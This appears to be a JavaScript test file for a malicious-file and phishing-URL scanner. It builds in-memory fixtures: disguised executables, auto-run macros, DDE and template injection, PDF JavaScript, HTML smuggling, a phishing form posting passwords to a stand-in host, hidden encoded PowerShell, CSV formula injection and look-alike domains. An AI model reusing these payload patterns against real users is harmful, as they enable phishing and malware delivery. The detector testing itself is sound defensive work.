// node tool_apps_src/file-check-tests.js -- MES File Safety Check detection logic (tool_apps_src/file-check/lib.js)
// Every fixture is built here in memory (no real malware, nothing written to disk).
var S = require('./file-check/lib.js'), zlib = require('zlib'), crypto = require('crypto');
var n = 0, fails = 0;
function ok(c, m) { n++; if (!c) { fails++; console.log('FAIL ' + m); } }
function eq(a, b, m) { n++; if (a !== b) { fails++; console.log('FAIL ' + m + ': ' + JSON.stringify(a) + ' vs ' + JSON.stringify(b)); } }
var opts = { inflateRaw: function (u) { return Promise.resolve(new Uint8Array(zlib.inflateRawSync(u))); }, inflate: function (u) { return Promise.resolve(new Uint8Array(zlib.inflateSync(u))); } };
function B(x) { return typeof x === 'string' ? new Uint8Array(Buffer.from(x, 'latin1')) : new Uint8Array(x); }
function cat() { var parts = [].slice.call(arguments).map(B), len = parts.reduce(function (a, p) { return a + p.length; }, 0), o = new Uint8Array(len), at = 0; parts.forEach(function (p) { o.set(p, at); at += p.length; }); return o; }
function scan(bytes, name) { return S.analyze(S.bytesSource(B(bytes)), name, opts); }
function codes(r) { return r.findings.map(function (f) { return f.code; }); }
function u16(v) { return [v & 255, (v >> 8) & 255]; }
function u32(v) { return [v & 255, (v >> 8) & 255, (v >> 16) & 255, (v >>> 24) & 255]; }
/* a tiny ZIP writer (stored or deflated entries; flag bit 0 = "encrypted" for the password test) */
function zip(files) {
	var local = [], central = [], off = 0;
	files.forEach(function (f) {
		var data = B(f.data), name = Buffer.from(f.name, 'utf8'), comp = f.deflate ? new Uint8Array(zlib.deflateRawSync(Buffer.from(data))) : data;
		var crc = zlib.crc32 ? zlib.crc32(Buffer.from(data)) : 0, method = f.deflate ? 8 : 0, flags = (f.enc ? 1 : 0) | 0x800;
		var lh = cat([0x50, 0x4B, 3, 4], u16(20), u16(flags), u16(method), u16(0), u16(0), u32(crc), u32(comp.length), u32(f.fakeSize || data.length), u16(name.length), u16(0), name, comp);
		central.push(cat([0x50, 0x4B, 1, 2], u16(20), u16(20), u16(flags), u16(method), u16(0), u16(0), u32(crc), u32(comp.length), u32(f.fakeSize || data.length), u16(name.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(f.sameAs != null ? f.sameAs : off), name));
		local.push(lh); off += lh.length;
	});
	var cd = cat.apply(null, central);
	return cat(cat.apply(null, local), cd, [0x50, 0x4B, 5, 6], u16(0), u16(0), u16(files.length), u16(files.length), u32(cd.length), u32(off), u16(0));
}
/* a minimal OLE compound file: FAT in sector 0, directory in sector 1, given entry names */
function cfb(entries, clsid) {
	var h = new Uint8Array(512); h.set([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
	h.set(u16(0x3E), 24); h.set(u16(3), 26); h.set([0xFE, 0xFF], 28); h.set(u16(9), 30); h.set(u16(6), 32);
	h.set(u32(1), 44); h.set(u32(1), 48); h.set(u32(4096), 56); h.set(u32(0xFFFFFFFE), 60); h.set(u32(0xFFFFFFFE), 68);
	for (var i = 0; i < 109; i++) h.set(u32(i === 0 ? 0 : 0xFFFFFFFF), 76 + i * 4);
	var fat = new Uint8Array(512).fill(0xFF); fat.set(u32(0xFFFFFFFD), 0); fat.set(u32(0xFFFFFFFE), 4);
	var dir = new Uint8Array(512);
	entries.forEach(function (e, j) {
		var o = j * 128, nm = e[0] + '\0'; for (var k = 0; k < nm.length; k++) dir.set(u16(nm.charCodeAt(k)), o + k * 2);
		dir.set(u16(nm.length * 2), o + 64); dir[o + 66] = e[1];
		if (e[1] === 5 && clsid) dir.set(clsid, o + 80);
	});
	return cat(h, fat, dir);
}
var PE = (function () { var b = new Uint8Array(512); b.set(B('MZ')); b.set(u32(0x80), 0x3C); b.set(B('PE\0\0'), 0x80); b.set(u16(0x8664), 0x84); b.set(u16(0x22), 0x80 + 22); b.set(u16(0x20b), 0x80 + 24); return b; })();
var PDF_JS = '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Pages 3 0 R >>\nendobj\n2 0 obj\n<< /S /JavaScript /JS (app.alert\\(1\\)) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n';
var DOCX_TYPES = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>';

var tests = [];
function t(name, fn) { tests.push([name, fn]); }

t('fake exe with a pdf name', function () { return scan(PE, 'Invoice_2026.pdf').then(function (r) { eq(r.type.id, 'exe', 'sniffed exe'); eq(r.level, 3, 'danger'); ok(codes(r).indexOf('disguised') >= 0, 'disguised'); ok(/64-bit/.test(r.type.label), '64-bit noticed'); }); });
t('real exe is caution, not danger', function () { return scan(PE, 'setup.exe').then(function (r) { eq(r.level, 2, 'caution'); ok(codes(r).indexOf('runs') >= 0, 'runs code'); }); });
t('double extension', function () { return scan(PE, 'invoice.pdf.exe').then(function (r) { eq(r.level, 3, 'danger'); ok(codes(r).indexOf('double') >= 0, 'double'); }); });
t('right-to-left override', function () { return scan(PE, 'photo\u202Egpj.exe').then(function (r) { eq(r.level, 3, 'danger'); ok(codes(r).indexOf('rlo') >= 0, 'rlo'); }); });
t('space padding', function () { return scan(PE, 'report.pdf                                        .exe').then(function (r) { ok(codes(r).indexOf('pad') >= 0, 'padding'); eq(r.level, 3, 'danger'); }); });
t('EICAR', function () { return scan(S.eicarBytes(), 'eicar.com').then(function (r) { eq(r.type.id, 'eicar', 'eicar type'); eq(r.level, 3, 'eicar flagged'); }); });
t('EICAR + trailing newline still counts', function () { return scan(cat(S.eicarBytes(), '\r\n'), 'eicar.txt').then(function (r) { eq(r.type.id, 'eicar', 'eicar with CRLF'); }); });
t('EICAR in a zip', function () { return scan(zip([{ name: 'eicar.com', data: S.eicarBytes(), deflate: true }]), 'eicar_com.zip').then(function (r) { eq(r.level, 3, 'zip with eicar = danger'); eq(r.children[0].type.id, 'eicar', 'child eicar'); }); });
t('not EICAR when longer than 128 bytes', function () { return scan(cat(S.eicarBytes(), new Array(100).fill(65)), 'x.txt').then(function (r) { ok(r.type.id !== 'eicar', 'not the official test file'); ok(codes(r).indexOf('eicarin') >= 0, 'but noted'); }); });
t('docm with macros', function () {
	var vba = 'Attribute VB_Name = "ThisDocument"\0Sub AutoOpen()\0Shell "calc.exe"\0';
	var z = zip([{ name: '[Content_Types].xml', data: DOCX_TYPES, deflate: true }, { name: 'word/document.xml', data: '<w:document><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>', deflate: true }, { name: 'word/vbaProject.bin', data: vba, deflate: true }]);
	return scan(z, 'Payment.docm').then(function (r) { eq(r.type.id, 'ooxml', 'office'); ok(/Word/.test(r.type.label), 'Word'); eq(r.level, 3, 'auto macro = danger'); ok(codes(r).indexOf('macroauto') >= 0, 'macroauto'); });
});
t('docx renamed with macros', function () {
	var z = zip([{ name: '[Content_Types].xml', data: DOCX_TYPES }, { name: 'word/document.xml', data: '<w:document/>' }, { name: 'word/vbaProject.bin', data: 'just a macro' }]);
	return scan(z, 'letter.docx').then(function (r) { ok(codes(r).indexOf('macro') >= 0, 'plain macro'); ok(codes(r).indexOf('macrorename') >= 0, 'renamed'); eq(r.level, 2, 'caution'); });
});
t('clean docx', function () {
	var z = zip([{ name: '[Content_Types].xml', data: DOCX_TYPES, deflate: true }, { name: 'word/document.xml', data: '<w:document><w:body/></w:document>', deflate: true }]);
	return scan(z, 'notes.docx').then(function (r) { eq(r.level, 0, 'no red flags'); });
});
t('template injection', function () {
	var rel = '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.5/t.dotm" TargetMode="External"/></Relationships>';
	var z = zip([{ name: '[Content_Types].xml', data: DOCX_TYPES }, { name: 'word/document.xml', data: '<w:document/>' }, { name: 'word/_rels/settings.xml.rels', data: rel, deflate: true }]);
	return scan(z, 'cv.docx').then(function (r) { ok(codes(r).indexOf('template') >= 0, 'template'); eq(r.level, 3, 'danger'); });
});
t('DDE field', function () {
	var doc = '<w:document><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:r></w:p></w:body></w:document>';
	var z = zip([{ name: '[Content_Types].xml', data: DOCX_TYPES }, { name: 'word/document.xml', data: doc }]);
	return scan(z, 'dde.docx').then(function (r) { ok(codes(r).indexOf('dde') >= 0, 'dde'); });
});
t('OLE doc with VBA', function () { return scan(cfb([['Root Entry', 5], ['WordDocument', 2], ['Macros', 1], ['VBA', 1]]), 'old.doc').then(function (r) { ok(/Word/.test(r.type.label), 'word 97 ' + r.type.label); ok(codes(r).indexOf('macro') >= 0, 'vba found'); }); });
t('MSI disguised as doc', function () {
	var clsid = [0x84, 0x10, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46];
	return scan(cfb([['Root Entry', 5]], clsid), 'contract.doc').then(function (r) { ok(/Installer/.test(r.type.label), 'msi clsid'); eq(r.level, 3, 'disguised installer'); });
});
t('PDF with JavaScript', function () { return scan(PDF_JS, 'statement.pdf').then(function (r) { eq(r.type.id, 'pdf', 'pdf'); ok(codes(r).indexOf('pdfjs') >= 0, 'js'); eq(r.level, 3, 'js + openaction = danger'); }); });
t('PDF /Launch', function () { return scan('%PDF-1.4\n1 0 obj << /S /Launch /F (cmd.exe) >> endobj\n', 'a.pdf').then(function (r) { ok(codes(r).indexOf('launch') >= 0, 'launch'); eq(r.level, 3, 'danger'); }); });
t('PDF hex-obfuscated name', function () { return scan('%PDF-1.4\n1 0 obj << /S /J#61vaScript /JS (x) >> endobj\n', 'a.pdf').then(function (r) { ok(codes(r).indexOf('pdfhex') >= 0, 'hex name'); }); });
t('PDF JavaScript hidden in an object stream', function () {
	var inner = Buffer.from('3 0 << /S /JavaScript /JS (app.alert(1)) >>');
	var comp = zlib.deflateSync(inner);
	var pdf = cat('%PDF-1.5\n5 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ' + comp.length + ' >>\nstream\n', new Uint8Array(comp), '\nendstream\nendobj\n');
	return scan(pdf, 'b.pdf').then(function (r) { ok(codes(r).indexOf('pdfjs') >= 0, 'js found in ObjStm'); ok(codes(r).indexOf('pdfstm') >= 0, 'stm note'); });
});
t('plain PDF', function () { return scan('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n<< /URI (https://mes.fm) >>\n', 'ok.pdf').then(function (r) { eq(r.level, 1, 'only a note about a link'); }); });
t('password zip with exe', function () { return scan(zip([{ name: 'scan.exe', data: PE, enc: true }]), 'docs.zip').then(function (r) { ok(codes(r).indexOf('password') >= 0, 'password'); eq(r.level, 3, 'locked exe = danger'); }); });
t('zip with one disguised exe', function () { return scan(zip([{ name: 'Invoice.pdf.exe', data: PE, deflate: true }]), 'invoice.zip').then(function (r) { eq(r.level, 3, 'danger'); ok(codes(r).indexOf('loneprog') >= 0, 'lone program'); }); });
t('zip bomb ratio', function () { return scan(zip([{ name: 'a.txt', data: 'AAAA', fakeSize: 4000000000 }]), 'bomb.zip').then(function (r) { ok(codes(r).indexOf('bomb') >= 0, 'bomb'); }); });
t('zip bomb overlap', function () { return scan(zip([{ name: 'a.txt', data: 'hello' }, { name: 'b.txt', data: 'hello', sameAs: 0 }, { name: 'c.txt', data: 'hello', sameAs: 0 }]), 'o.zip').then(function (r) { ok(codes(r).indexOf('bomb') >= 0, 'overlap bomb'); }); });
t('nested zip', function () { var inner = zip([{ name: 'run.vbs', data: 'Set s = CreateObject("WScript.Shell")', deflate: true }]); return scan(zip([{ name: 'inner.zip', data: inner }]), 'outer.zip').then(function (r) { ok(r.level >= 2, 'nested script found'); eq(r.children[0].children[0].name, 'run.vbs', 'two levels deep'); }); });
t('jar disguised', function () { return scan(zip([{ name: 'META-INF/MANIFEST.MF', data: 'Manifest-Version: 1.0' }, { name: 'a/Main.class', data: [0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52] }]), 'photo.jpg').then(function (r) { eq(r.type.id, 'jar', 'jar'); eq(r.level, 3, 'disguised'); }); });
t('HTML phishing', function () {
	var h = '<!doctype html><html><body><form action="https://evil.example/collect.php" method="post"><input type="email" name="email"><input type="password" name="pw"><button>Sign in</button></form></body></html>';
	return scan(h, 'Secure_Message.html').then(function (r) { ok(codes(r).indexOf('login') >= 0, 'login form'); eq(r.level, 3, 'sends password = danger'); });
});
t('HTML smuggling', function () { return scan('<html><script>var b=atob("TVo=");var bl=new Blob([b]);var a=document.createElement("a");a.href=URL.createObjectURL(bl);a.download="x.iso";a.click()</script></html>', 'doc.htm').then(function (r) { ok(codes(r).indexOf('smuggle') >= 0, 'smuggle'); }); });
t('SVG with script', function () { return scan('<svg xmlns="http://www.w3.org/2000/svg"><script>location="https://x.example"</script></svg>', 'logo.svg').then(function (r) { ok(codes(r).indexOf('svgscript') >= 0, 'svg script'); }); });
t('HTML named jpg', function () { return scan('<html><body>hi</body></html>', 'cat.jpg').then(function (r) { ok(codes(r).indexOf('htmldisguise') >= 0, 'html as jpg'); }); });
t('url shortcut to file share', function () { return scan('[InternetShortcut]\r\nURL=file://198.51.100.7/share/run.exe\r\n', 'Click me.url').then(function (r) { ok(codes(r).indexOf('shortfile') >= 0, 'file url'); eq(r.level, 3, 'danger'); }); });
t('url shortcut to look-alike', function () { return scan('[InternetShortcut]\nURL=https://paypa1.com/login\n', 'PayPal.url').then(function (r) { eq(r.level, 3, 'lookalike in shortcut'); }); });
t('webloc', function () { return scan('<?xml version="1.0"?><!DOCTYPE plist><plist version="1.0"><dict><key>URL</key><string>https://mes.fm/</string></dict></plist>', 'mes.webloc').then(function (r) { ok(r.level <= 1, 'harmless webloc'); eq(r.info.target, 'https://mes.fm/', 'target read'); }); });
t('powershell encoded', function () { return scan('powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=', 'update.bat').then(function (r) { ok(codes(r).indexOf('psenc') >= 0, 'encoded ps'); eq(r.level, 3, 'danger'); }); });
t('text file mentioning powershell stays a note', function () { return scan('notes: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=', 'notes.txt').then(function (r) { eq(r.level, 1, 'note only'); }); });
t('CSV formula injection', function () { return scan('name,value\nbob,=cmd|\' /C calc\'!A0\n', 'data.csv').then(function (r) { ok(codes(r).indexOf('csvinject') >= 0, 'csv inject'); }); });
t('png is fine', function () { return scan([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 13], 'cat.png').then(function (r) { eq(r.level, 0, 'png ok'); eq(r.type.id, 'png', 'png'); }); });
t('png named exe', function () { return scan([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A], 'cat.exe').then(function (r) { ok(r.level >= 2, 'exe ext still warns'); }); });
t('lnk running powershell', function () { var l = cat([0x4C, 0, 0, 0, 1, 0x14, 2, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46], new Uint8Array(Buffer.from('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden', 'utf16le'))); return scan(l, 'Document.lnk').then(function (r) { ok(codes(r).indexOf('lnkcmd') >= 0, 'lnk cmd'); eq(r.level, 3, 'danger'); }); });
t('ELF without extension', function () { return scan([0x7F, 0x45, 0x4C, 0x46, 2, 1, 1, 0], 'tool').then(function (r) { eq(r.type.id, 'elf', 'elf'); eq(r.level, 2, 'caution'); }); });
t('empty file', function () { return scan([], 'empty.txt').then(function (r) { eq(r.level, 0, 'empty is fine'); }); });
t('RTF equation exploit', function () { return scan('{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 0105000002000000}}}', 'order.rtf').then(function (r) { ok(codes(r).indexOf('rtfeq') >= 0, 'equation'); ok(codes(r).indexOf('rtfupd') >= 0, 'objupdate'); }); });

/* sync checks */
eq(S.md5(B('')), 'd41d8cd98f00b204e9800998ecf8427e', 'md5 empty');
eq(S.md5(B('The quick brown fox jumps over the lazy dog')), '9e107d9d372bb6826bd81d3542a419d6', 'md5 fox');
(function () { var big = crypto.randomBytes(100003); eq(S.md5(new Uint8Array(big)), crypto.createHash('md5').update(big).digest('hex'), 'md5 random 100 KB'); })();
eq(S.punyDecode('pypal-4ve'), 'pаypal', 'punycode decode (Cyrillic a)');
eq(S.toUnicodeHost('xn--mnchen-3ya.de'), 'münchen.de', 'IDN to unicode');
eq(S.registrable('a.b.example.co.uk'), 'example.co.uk', 'registrable co.uk');
eq(S.editDist('paypal', 'paypa1'), 1, 'edit distance');
function U(u) { return S.checkUrl(u); }
function has(r, c) { return r.findings.some(function (f) { return f.code === c; }); }
eq(U('https://www.paypal.com/signin').level, 0, 'real paypal');
eq(U('https://paypa1.com/login').level, 3, 'paypa1');
eq(U('https://xn--pypal-4ve.com/').level, 3, 'Cyrillic a paypal');
ok(has(U('https://xn--pypal-4ve.com/'), 'mixed'), 'mixed script flagged');
eq(U('https://paypal.com.secure-login.net/').level, 3, 'brand as subdomain');
eq(U('https://paypal-verify.com').level, 3, 'brand with hyphen');
eq(U('https://www.google.com@evil.example/').level, 3, '@ trick');
ok(has(U('http://3232235777/'), 'ipobf'), 'decimal IP');
ok(has(U('http://192.168.1.1/'), 'ip'), 'plain IP');
ok(has(U('https://bit.ly/abc'), 'short'), 'shortener');
ok(has(U('https://github.com.zip/x'), 'tld'), '.zip tld');
ok(has(U('https://example.com/setup.exe'), 'dl'), 'download link');
eq(U('javascript:alert(1)').level, 3, 'javascript scheme');
ok(has(U('https://example.com/r?u=https%3A%2F%2Fevil.example'), 'redirectparam'), 'embedded url');
ok(U('https://pineapple.com').level < 2, 'pineapple is not apple');
ok(U('https://purchase.com').level < 2, 'purchase is not chase');
eq(U('https://www.google.de/').level, 1, 'google.de only a note');
ok(U('mes.fm').level <= 1, 'bare host parsed');
eq(U('hxxps://evil[.]example/x').host, 'evil.example', 'defanged url');
ok(/virustotal\.com\/gui\/file\/abc/.test(S.links.vtFile('abc')), 'vt file link');
ok(S.links.vtUrl('https://a.b/').indexOf('https%253A%252F%252F') > 0, 'vt url double-encoded');
ok(/^MES File Safety Check report/.test(S.toText([])), 'text report');
eq(S.toCSV([{ name: 'a,b.exe', size: 1, type: { label: 'x' }, level: 2, findings: [{ level: 2, msg: 'm' }] }]).split('\n')[1].indexOf('"a,b.exe"'), 0, 'csv quoting');
ok(S.eicarBytes().length === 68, 'eicar 68 bytes');
ok(require('fs').readFileSync(__dirname + '/file-check/lib.js', 'latin1').indexOf(Buffer.from(S.eicarBytes()).toString('latin1')) < 0, 'lib.js does not contain the EICAR string itself');

tests.reduce(function (p, x) { return p.then(function () { return x[1]().catch(function (e) { fails++; console.log('FAIL ' + x[0] + ' threw ' + (e && e.stack)); }); }); }, Promise.resolve()).then(function () {
	console.log((fails ? fails + ' failed, ' : 'all passed, ') + n + ' checks, ' + tests.length + ' scenarios');
	process.exit(fails ? 1 : 0);
});
